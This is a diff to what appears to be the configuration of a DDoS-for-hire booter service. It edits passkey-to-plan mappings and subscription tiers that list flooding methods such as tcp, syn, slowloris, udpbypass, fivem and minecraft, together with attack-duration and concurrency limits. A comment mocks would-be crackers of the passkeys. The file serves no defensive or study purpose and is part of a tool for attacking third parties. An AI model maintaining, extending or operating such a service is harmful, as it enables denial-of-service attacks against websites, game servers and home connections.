@@ -24,7 +24,7 @@
 ##
 ##
 ##
-##sorry skids and larps, but adjusting and previewing vile is NOT cracking, i update  passkeys often so enjoy your skidded scripts LOL,
+##sorry skids and larps, but adjusting and previewing file is NOT cracking, i update  passkeys often so enjoy your skidded scripts LOL,
 ##
 ##
 ##
@@ -63,14 +63,13 @@ f1ff72b3f04a389ab96d9a508d5c2cfb = {
 "7gh": "hard",
 "098f6bcd4621d373cade4e832627b4f6": "hard",
 "ded681fc154529ebbc7562fb0c73ba47": "hard",
+    "ddos": "ddos",
 }
 
 PLANS = {
     "free":  {"methods": ["tcp","syn","curl","tcphex","http","synhex"], "maxtime": 120, "maxattacks": 5, "maxconcurrents": 1, "total_bandwidth_mb": 100},
-    "hard":  {"methods": ["tcp","tcphex","slowloris","curl","syn","home","hexgen","https","synhex"], "maxtime": 500, "maxattacks": 10, "maxconcurrents": 20, "total_bandwidth_mb": 500},
-    "pro":   {"methods": ["tcp","udp","http","https","curl","slowloris","nethold","minecraft","hexgen","tcphex","synhex"], "maxtime": 1000, "maxattacks": 50, "maxconcurrents": 50, "total_bandwidth_mb": 1000},
-    "vip":   {"methods": ["tcp","tcpbypass","udpbypass","curl","slowloris","nethold","home","fivem","minecraft","hexgen","tcphex","tlsvip","https","synhex"], "maxtime": 3600, "maxattacks": 100, "maxconcurrents": 299, "total_bandwidth_mb": 10000},
-    "admin": {"methods": ["*"], "maxtime": 9999, "maxattacks": None, "maxconcurrents": 1000, "total_bandwidth_mb": None}
+    "ddos":   {"methods": ["tcp","syn","http","https","curl","nethold","tcphex","synhex"], "maxtime": 300, "maxattacks": 50, "maxconcurrents": 50, "total_bandwidth_mb": 1000},
+    "hard":  {"methods": ["tcp","tcphex","slowloris","curl","syn","home","hexgen","https","synhex"], "maxtime": 500, "maxattacks": 10, "maxconcurrents": 20, "total_bandwidth_mb": 5000},
 }
 
 ALL_METHODS = ["tcp","udp","http","https","curl","syn","slowloris","nethold","home","sslslam","tlsvip","fivem","minecraft","hexgen","udphex","tcphex","synhex"]
